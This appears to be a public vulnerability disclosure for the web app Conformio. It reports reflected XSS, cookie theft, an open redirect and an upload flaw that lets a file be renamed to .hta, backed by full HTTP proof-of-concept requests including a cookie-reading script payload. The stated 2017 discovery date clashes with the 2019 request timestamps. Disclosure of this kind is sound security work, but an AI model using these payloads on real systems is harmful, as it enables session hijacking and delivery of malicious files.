@@ -1,0 +1,174 @@
+# Exploit Title: Conformio-Online Compliance Tool Multiple Vulnerabilities.
+# Discovered Date: 16/11/2017
+# Exploit Author: Ramikan 
+# Website: http://fact-in-hack.blogspot.com
+# Affected Product: Online Compliance Tool- Conformio
+# Version: Cloud Based Application
+# CVE : N/A
+# Category: Web Apps
+
+
+*************************************************************************************************************************************
+
+Vulnerability 1: Reflected Cross Site Scripting
+
+*************************************************************************************************************************************
+Description: An authenticated user can submit a malicious script into the search field and this value is not validated by the server and it reflects back on the front end to cause XSS.
+
+Affected URL: /web/dataset/call_kw/project.project/search_all
+
+Affected Parameter: search_term
+
+
+*************************************************************************************************************************************
+POC:
+*************************************************************************************************************************************
+
+Request:
+
+POST /web/dataset/call_kw/project.project/search_all HTTP/1.1
+Host: demo.conformio.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://demo.conformio.com/web?token=s0nIqmQ9GKaFtAEAgpr0&db=caretower
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 359
+Connection: close
+Cookie: session_id=b43fb60========================c5bb1====
+
+{"jsonrpc":"2.0","method":"call","params":{"model":"project.project","method":"search_all","args":[{"search_term":"<script>alert(document.cookie)</script>","query_element":"all","related_users":"","projects":"","tags":"","status":"","date_range":"2019-07-11 - 2019-07-18","query_task_element":"","limit":30,"related_users_by":""}],"kwargs":{}},"id":38301}
+
+
+Response:
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 18 Jul 2019 09:16:16 GMT
+Content-Type: application/json
+Content-Length: 49
+Connection: close
+Set-Cookie: session_id=b43fb60========================c5bb1=====; Expires=Wed, 16-Oct-2019 09:16:16 GMT; Max-Age=7776000; Path=/
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+
+{"jsonrpc": "2.0", "id": 383301, "result": []}
+
+
+
+*************************************************************************************************************************************
+
+Vulnerability 2: Session Fixation
+
+*************************************************************************************************************************************
+
+Description: It is possible to steal the cookie "session_id" using the above XSS attack and obtain the session cookie since there is no secure flag option to protect the cookie.
+
+
+Affected URL: https://domain.conformio.com/web/login/
+
+Affected Parameter: Cookie: session_id
+
+
+
+*************************************************************************************************************************************
+
+Vulnerability 3: Open Redirection
+
+*************************************************************************************************************************************
+
+Description: It is possible for an unauthenticated user to modify the value of 'redirect'parameter with any domain name and the server redirects the victim after they log in successfully.
+
+
+Affected URL: https://domain.conformio.com/web/login?redirect=http%3A%2F%2Fgoogle.com%2Fweb%3F
+
+
+Affected Parameter: redirect
+
+
+
+*************************************************************************************************************************************
+
+Vulnerability 4: File Upload Missing Control
+
+*************************************************************************************************************************************
+
+Description: It is possible for an unthenticated user to modify the file type of the file from .DOCX to any other file type by intercepting the request to the server.
+
+
+Affected URL: /web/dataset/call_kw/ir.attachment/write
+
+
+Affected Parameter: name
+
+
+POC:
+
+Request:
+
+POST /web/dataset/call_kw/ir.attachment/write HTTP/1.1
+Host: demo.conformio.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://demo.conformio.com/web
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 245
+Connection: close
+Cookie: session_id=241b76b9a9f==========================sdfsd8
+
+{"jsonrpc":"2.0","method":"call","params":{"model":"ir.attachment","method":"write","args":[[8510],{"name":"test.hta.docx"}],"kwargs":{"context":{"lang":"en_US","tz":false,"uid":191706,"id":85410,"attachment_side_form":true}}},"id":5146}
+
+
+Response:
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 18 Jul 2019 15:07:46 GMT
+Content-Type: application/json
+Content-Length: 51
+Connection: close
+Set-Cookie: session_id=241b76b9a9f==========================sdfsd8; Expires=Wed, 16-Oct-2019 15:06:16 GMT; Max-Age=7776000; Path=/
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+
+{"jsonrpc": "2.0", "id": 514549236, "result": true}
+
+
+
+Modified Request:
+
+Rmeoved the file extention .docx under the name parameter.
+
+Request:
+
+POST /web/dataset/call_kw/ir.attachment/write HTTP/1.1
+Host: demo.conformio.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://demo.conformio.com/web
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 245
+Connection: close
+Cookie: session_id=241b76b9a9f==========================sdfsd8
+
+{"jsonrpc":"2.0","method":"call","params":{"model":"ir.attachment","method":"write","args":[[8510],{"name":"test.hta"}],"kwargs":{"context":{"lang":"en_US","tz":false,"uid":191706,"id":85410,"attachment_side_form":true}}},"id":5146}
+
+
+Response:
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 18 Jul 2019 15:07:46 GMT
+Content-Type: application/json
+Content-Length: 51
+Connection: close
+Set-Cookie: session_id=241b76b9a9f==========================sdfsd8:46 GMT; Max-Age=7776000; Path=/
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+
+{"jsonrpc": "2.0", "id": 514549236, "result": true}
